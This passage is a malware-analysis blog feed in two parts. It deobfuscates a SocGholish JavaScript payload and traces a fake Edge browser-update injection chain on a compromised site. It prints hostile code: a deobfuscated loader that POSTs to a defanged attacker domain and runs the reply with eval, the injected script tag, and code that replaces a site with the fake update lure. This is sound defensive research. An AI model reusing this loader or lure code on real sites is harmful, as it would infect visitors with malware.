            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">while_breaker</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x4e081b</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x4c3fe3</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x1</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x5f22db</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x4a3d3f</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x53d10b</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x1abe2b</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x3</span> <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x38e02a</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x2eb8e4</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x234973</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x37e27f</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x5</span>) <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x6c65c0</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x259809</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x6</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x1c3c75</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x560688</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x7</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x23f8ea</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x185e90</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x4a0b3f</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x5af55a</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x9</span> <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x50eac5</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x3f2c12</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0xa</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x49bff8</span>, <span style="color:#a6e22e">array_strings</span>.<span style="color:#a6e22e">_0x540725</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0xb</span>);
            
            <span style="color:#75715e">//if result of above == 964931, then break and stop shifting array
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">while_breaker</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">_0x585212</span>) <span style="color:#66d9ef">break</span>;
            <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;push&#39;</span>](<span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;shift&#39;</span>]());
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">_0x3f5ce4</span>) {
            <span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;push&#39;</span>](<span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;shift&#39;</span>]());
        }
    } 
</code></pre></div><p>Starting in the <code>try</code> statement, the first thing the while loop does is create a variable, <code>while_breaker</code>, whose value is the result of a long, complex series of arithmetic operations and function calls. The following <code>if</code> statement checks to see whether <code>while_breaker</code> is strictly equal to the second argument of the main function, the number 964931.<br>
If they are equal, the while loop breaks and the end of the self-invoked function is reached. If they are not equal, the array removes its first element and passes the element to an invocation of &ldquo;push&rdquo; &ndash; effectively rotating the array by moving the first element of the array to the end of the array.<br>
If anything in the <code>try</code> statement fails, the array is still shifted in the <code>catch</code> statement.</p>
<p>In effect, the entire purpose of the self-invoked function is to take the array created by <code>get_array</code> and rotate it <code>X</code> number of times. When, and only when, it has been rotated the correct number of times will the <code>while_breaker</code> value be set to 964931 and the while loop break.</p>
<p>Moving on to the next important piece of the puzzle, the deobfuscator function.</p>
<h3 id="deobfuscator-function-and-beyond">Deobfuscator Function And Beyond</h3>
<p>I cleaned and notated the deobfuscator function enough to understand the basic behavior, but I will admit, there are some sections in which I did not spend a lot of time in the weeds. Specifically, the two functions defined within <code>deobfuscator</code> on lines 68 and 80, and their respective for-loops. In this case, it was enough to understand they perform &ldquo;some action&rdquo; on the arguments passed to them. No deep dive into the specific for-loop shenanigans necessary.<br>
With that said, I have provided comments as to my understanding of the deobfuscator function in the code screenshot, if interested. The quick and dirty explanation: using the <code>numeric_arg</code>, the function grabs a value from the <code>get_array</code> array. It modifies the <code>array_value</code> variable using a more complex series of functions, and returns a value.</p>
<p>Now we can finally get to the payload finale, the real important stuff &ndash; lines 50, 51, 52, and 122.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">activex_object</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;7FM9&#39;</span>, <span style="color:#ae81ff">0x2a1</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;@f0l&#39;</span>, <span style="color:#ae81ff">0x2a3</span>));
<span style="color:#a6e22e">activex_object</span>[<span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;@f0l&#39;</span>, <span style="color:#ae81ff">0x293</span>)](<span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;7#tp&#39;</span>, <span style="color:#ae81ff">0x28a</span>), <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;Yu2X&#39;</span>, <span style="color:#ae81ff">0x2a0</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;Fo89&#39;</span>, <span style="color:#ae81ff">0x2ab</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;HSRT&#39;</span>, <span style="color:#ae81ff">0x2a9</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;jlDe&#39;</span>, <span style="color:#ae81ff">0x29f</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;oRu9&#39;</span>, <span style="color:#ae81ff">0x287</span>), <span style="color:#f92672">!</span>[]), 
<span style="color:#a6e22e">activex_object</span>[<span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;HC5I&#39;</span>, <span style="color:#ae81ff">0x285</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;)X0A&#39;</span>, <span style="color:#ae81ff">0x2a7</span>)](<span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;O)P#&#39;</span>, <span style="color:#ae81ff">0x2aa</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;HSRT&#39;</span>, <span style="color:#ae81ff">0x2ac</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">call_deobf_2</span>(<span style="color:#e6db74">&#39;@9eY&#39;</span>, <span style="color:#ae81ff">0x28e</span>), <span style="color:#e6db74">&#39;1&#39;</span>);
</code></pre></div><p>Starting with the first two lines, we can see a variable of type <code>ActiveXObject</code> is being created, but the argument passed in is the result of two function calls. How can we determine what this value may be?</p>
<p>Since I know the purposes of the <code>get_array</code> and <code>deobfuscator</code> functions are &ldquo;benign&rdquo; (not directly executing malicious code), I can start up a Node REPL (Read-Eval-Print-Loop) session to play with the JavaScript dynamically. To do this, simply enter <code>node</code> in the command prompt, provided Node.js is installed on the device.</p>
<p>Once here, I pasted the two functions into REPL, as it will save functions for the duration of the session.<br>
Then, I pasted the entire anonymous, self-invoking function into REPL as well, since I know all it does it rotate the array. Perfect, now all we need to do is paste lines 54-59 (a function which calls <code>deobfuscator</code> I named <code>call_deobf_2</code>) into REPL and I can start manually deobfuscating.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/node_example.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/node_example.png"
            alt="node_example"
            />
    </a>
    
</figure>
<p>So, now we know line 50 is actually</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">activex_object</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;MSXML2.XMLHTTP&#39;</span>)
</code></pre></div><p>and is how to define an XMLHTTP object, which provides client-side protocol support for communication with HTTP servers.</p>
<p>Performing the same action, the remaining three lines are (intentionally defanged)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#ae81ff">51</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">activex_object</span>[<span style="color:#e6db74">&#39;open&#39;</span>](<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;https://e9171.asset.tradingvein[.]xyz/subscribeEvent&#39;</span>, <span style="color:#f92672">!</span>[]), 
<span style="color:#ae81ff">52</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">activex_object</span>[<span style="color:#e6db74">&#39;setRequestHeader&#39;</span>](<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>);
<span style="color:#ae81ff">122</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">activex_object</span>[<span style="color:#e6db74">&#39;send&#39;</span>](<span style="color:#e6db74">&#39;0fLZsUtGNjQj6htMDKjCPOqLbq6CaK8DLSt7/ur7qQ==&#39;</span>), <span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#39;eval&#39;</span>](<span style="color:#a6e22e">activex_object</span>[<span style="color:#e6db74">&#39;responseText&#39;</span>]);
</code></pre></div><p>We&rsquo;ve done it! Line 51 initializes a non-asynchronous POST request to a new domain and line 52 sets the Upgrade-Insecure-Requests header to 1, so HTTP will not be used as a fallback if HTTPS fails. Finally, line 122 sends a base64 encoded string to the domain and executes what is returned in the responseText.</p>
<p>Line 122 is the transition into the next stage of infection. The <code>eval</code> statement causes the immediate execution of whatever is passed to it, and will be done so in the context of the current code, meaning any currently declared functions and variables will be usable by the new code. It is safe to assume the responseText will contain more JavaScript.</p>
<h3 id="summary">Summary</h3>
<p>When it boils down, the entire payload could have been written in a handful of lines &ndash; the obfuscation techniques and the distracting <code>Underscore</code> library composed the bulk of the payload.</p>
<p>Even though it is not necessary for defense or quick analysis, I enjoy doing deep dives on samples such as these to really understanding the inner workings. Chalk it up to perfectionism, but I usually learn quite a few things while doing so, and it is a great way to build up skills.</p>
<p>Unfortunately, I did not execute the payload on my VM so this is as far as I can go for now.<br>
I plan on running through the attack chain once again, but next time taking it a few steps further.<br>
Look for a part three in the future where I will capture and analyze the next phases.</p>
]]></content>
        </item>
        
        <item>
            <title>SocGholish Series - Part 1</title>
            <link>https://rerednawyerg.github.io/posts/malwareanalysis/socgholish/</link>
            <pubDate>Thu, 12 Jan 2023 15:57:49 -0600</pubDate>
            
            <guid>https://rerednawyerg.github.io/posts/malwareanalysis/socgholish/</guid>
            <description>For my first attempt at malware analysis blogging, I wanted to go with something familiar. I&amp;rsquo;ve seen the &amp;ldquo;Fake Updates&amp;rdquo; or SocGholish breed of malware both at work and during personal research, so I decided to begin here.
One can find many useful, and far better, analysis on this malware from many fantastic researchers simply with light Googling.</description>
            <content type="html"><![CDATA[<hr>
<p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.css" integrity="sha256-sCl5PUOGMLfFYctzDW3MtRib0ctyUvI9Qsmq2wXOeBY=" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/default-skin/default-skin.min.css" integrity="sha256-BFeI1V+Vh1Rk37wswuOYn5lsTcaU96hGaI7OUVCLjPc=" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.js" integrity="sha256-UplRCs9v4KXVJvVY+p+RSo5Q4ilAUXh7kpjyIP5odyc=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe-ui-default.min.js" integrity="sha256-PWHOlUzc96pMc8ThwRIXPn8yH4NOLu42RQ0b9SpnpFk=" crossorigin="anonymous"></script>


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="/js/pswp-init.js"></script>

For my first attempt at malware analysis blogging, I wanted to go with something familiar. I&rsquo;ve seen the &ldquo;Fake Updates&rdquo; or SocGholish breed of malware both at work and during personal research, so I decided to begin here.</p>
<p>One can find many useful, and far better, analysis on this malware from many fantastic researchers simply with light Googling. My intent is not to break new ground, but rather to get the hang of transcribing my thought process and methods in a succinct and understandable way &ndash; once I&rsquo;ve accomplished this, then I will begin to attempt to poke around in the unknown.</p>
<hr>
<h3 id="starting-out">Starting Out</h3>
<p>For those who may not be aware, social media is a great place for finding IOCs, or indicators of compromise. Simply head to the Twitter Explore page and search a particular malware family. Note: as of today it appears Twitter no longer allows non-user accounts to sort the Explore results by &ldquo;recent&rdquo;, which makes things a bit more difficult. <em>Edit</em>: I spoke too soon, the feature appears to be back as of 1/26/23.</p>
<p>Nevertheless, using Twitter I searched for &ldquo;SocGholish&rdquo; and found a tweet published a few days ago from @RootkitHalo</p>
<p><a href="https://twitter.com/RootkitHalo/status/1610647981266698242?s=20&amp;t=btWSUQgaXQXCe6G8YaEygw">https://twitter.com/RootkitHalo/status/1610647981266698242?s=20&amp;t=btWSUQgaXQXCe6G8YaEygw</a>.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/tweet.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/tweet.png"
            alt="twitter"
            />
    </a>
    
</figure>
<p>It appears sapboost[.]com may be worth checking out. I dropped it into <a href="URLScan.io">URLScan.io</a> to take an initial look.
Scrolling through the DOM section, I noticed a suspicious script referencing a domain with a long path. Based on previous investigations, this looks similar to injected scripts I have seen on other compromised sites, all of which led to a SocGholish payload.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/urlscan.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/urlscan.png"
            alt="urlscan"
            />
    </a>
    
</figure>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">async</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hxxps://taxes[.]rpacx[.]com/Db3LT4AuAlbSGri9pNj490sUTJorxDreSplsr42KB4ISAegLswAiDwMbb2EvZCqw&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;d2be214ae0a8a44b9a5aa916-text/javascript&#34;</span><span style="color:#f92672">&gt;</span> 
</code></pre></div><p>Note: Based on past experience, URLScan.io will not always capture these injected JavaScript snippets on compromised sites. In some cases, there appears to be some logic in place which looks for a referrer, and if one is not found, the JavaScript will not be written to the page. I am not certain, but I believe in some cases Google Tags may be repurposed for this sort of activity. If you ever run into this issue, a simple cURL command should suffice.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -k https://&lt;compromised_domain&gt; -A <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&#34;</span> --referer <span style="color:#e6db74">&#34;https://www.google.com&#34;</span> -o &lt;output_file&gt; 
</code></pre></div><hr>
<h3 id="exploring-the-embedded-script">Exploring The Embedded Script</h3>
<p>Taking the url from the embedded JS, I could try to cURL it and see what comes back. However, some infected sites will track visitors using various methods, including IP address, and only allow one trip through the attack chain per visitor, in part to make it more difficult for security researchers to investigate. With this in mind, I instead fired up a Windows VM, configured BurpSuite to capture my web traffic, and visited <code>sapboost[.]com</code> in the browser.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/compromised_site_download_page.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/compromised_site_download_page.png"
            alt="compromise"
            />
    </a>
    
</figure>
<p>And there we go, a page stating my version of Edge needs an update. How kind of this site to help me stay on the cutting edge of the browser wars.</p>
<p>Now let&rsquo;s break it down and see how I ended up here.</p>
<hr>
<h3 id="burpsuite-results">BurpSuite Results</h3>
<p>Here is the initial request to <code>sapboost[.]com</code> in Burpsuite, with the embedded script shown in the response.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/initial_inject.jpg"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/initial_inject.jpg"
            alt="inject"
            />
    </a>
    
</figure>
<p>Next, the first request out to the new domain: <code>taxes[.]rpacx[.]com</code></p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/first_call_to_rpacx_domain.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/first_call_to_rpacx_domain.png"
            alt="first_call"
            />
    </a>
    
</figure>
<p>The response checks a few items:</p>
<ul>
<li>Does the user agent indicate a Windows device? If not, do nothing.</li>
<li>Checks for the domain name of the site saved as an object in local storage. If it exists, do nothing. Likely a quick check to weed out repeat visitors.</li>
<li>Checks for the existence of Wordpress cookies, specifically whether the user is logged into a Wordpress account. If so, do nothing.</li>
<li>Checks whether a window property called &ldquo;jQueryLanding&rdquo; exists, which is not a default property of the window object. If it exists, do nothing.</li>
</ul>
<p>If all these checks pass, create the jQueryLanding property in the window object and assign the value &ldquo;true&rdquo;. This will cause the last check to fail if this section of code is executed again.<br>
Next, dynamically embed a script tag with a new random character path to the victim site, directly above the first script tag in the DOM.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">hxxps://taxes[.]rpacx[.]com/5UVv7hzd//UCIN0fZn3nxx/eQfVQ6EkFcnv4OoKjGCYP2PDddTY9p4zlo93or+Kn
</code></pre></div><p>Shown below is the response to the request to the new embedded script source. The intended effect of the response content is to render the fake update page shown in the screenshot.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/second_call_to_rpacx_domain.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/second_call_to_rpacx_domain.png"
            alt="second_call"
            />
    </a>
    
</figure></p>
<hr>
<h3 id="fake-update-page">Fake Update Page</h3>
<p>I&rsquo;m going to go into detail in regard to the functionality of the update page - if you aren&rsquo;t interested, feel free to skip ahead.<br>
Starting with the first line of the function - it creates a variable (with a name value of the current domain) inside the local storage object and sets the value to &ldquo;1&rdquo;. A previous script in the chain checked whether this variable existed, and if it did, stopped execution. This is another check to stop repeat visitors or security researchers from running through the infection chain multiple times.<br>
Then, set the domain variable to the domain used previously to fetch additional injected JS. Going forward, we&rsquo;ll refer to this domain as the stage2 domain.</p>
<p>The sendStatistics function is interesting, it creates a variable <code>i</code> of type <code>Image</code> and sets the src to the stage2 with the argument appended to it. We&rsquo;ll come back to this later.</p>
<p>Next, a nested for loop removes several attributes from the document head and body, and right after this the innerHTML of the document head and body are hardcoded. Looking closely we can see strings referencing updates to the browser. Essentially what this does is remove all content from the infected site and replace it with the fake update graphics. This way, the domain in the browser search bar doesn&rsquo;t change and no &ldquo;popups&rdquo; or additional calls to external domains are needed to serve up the content. The goal of this behavior is to reduce suspicion by intended victims and make them think the website actually requires a browser update in order to function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS">(<span style="color:#66d9ef">function</span>() {
    window.<span style="color:#a6e22e">localStorage</span>[window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hostname</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">domain</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hxxps://taxes[.]rpacx[.]com/&#39;</span>;

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendStatistics</span>(<span style="color:#a6e22e">type</span>) {
        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>();
        <span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">domain</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">type</span>;
    }
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">elems</span> <span style="color:#f92672">=</span> [document.<span style="color:#a6e22e">documentElement</span>, document.<span style="color:#a6e22e">head</span>, document.<span style="color:#a6e22e">body</span>];
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">attrs</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;class&#39;</span>, <span style="color:#e6db74">&#39;style&#39;</span>, <span style="color:#e6db74">&#39;lang&#39;</span>, <span style="color:#e6db74">&#39;id&#39;</span>, <span style="color:#e6db74">&#39;dir&#39;</span>];
    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">elems</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">attrs</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">++</span>) {
            <span style="color:#66d9ef">try</span> {
                <span style="color:#a6e22e">elems</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">removeAttribute</span>(<span style="color:#a6e22e">attrs</span>[<span style="color:#a6e22e">j</span>]);
            } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
        }
    }
    document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;meta http-equiv=&#34;content-type&#34; content=&#34;text/html; charset=UTF-8&#34;&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;meta charset=&#34;utf-8&#34;&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;title&gt;Update Edge&lt;/title&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;link href=&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">domain</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;updateassets/css.css&#34; rel=&#34;stylesheet&#34;&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;link href=&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">domain</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;updateassets/favicon/edge.ico&#34; rel=&#34;icon&#34; type=&#34;image/ico&#34;&gt;&#39;</span>;
    document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;compact fatnav-header&#34; id=&#34;header&#34;&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &lt;div class=&#34;g-section no-collapse&#34;&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  &lt;div class=&#34;g-unit g-first&#34; id=&#34;header-logo&#34;&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;   &lt;a href=&#34;#&#34;&gt;&lt;img id=&#34;logo&#34; src=&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">domain</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;updateassets/logo/edge.png&#34;&gt;&lt;/a&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  &lt;/div&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &lt;/div&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;/div&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;browser-landing&#34; id=&#34;main&#34;&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &lt;div class=&#34;compact browser-benefits&#34;&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  &lt;section id=&#34;marquee&#34;&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  &lt;h1 id=&#34;main-title&#34; tabindex=&#34;-1&#34;&gt;You are using an older version of Edge&lt;/h1&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  &lt;p class=&#34;browser-promo&#34;&gt;Update now to keep your Edge browser running smoothly and securely.&lt;/p&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  &lt;p class=&#34;browser-promo&#34;&gt;Your download will begin automatically. If not, click here:&lt;/p&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  &lt;a class=&#34;button eula-download-button download-button desktop-only hide-cros&#34; href=&#34;javascript:void(0)&#34;&gt;Update Edge&lt;/a&gt;&#39;</span> <span 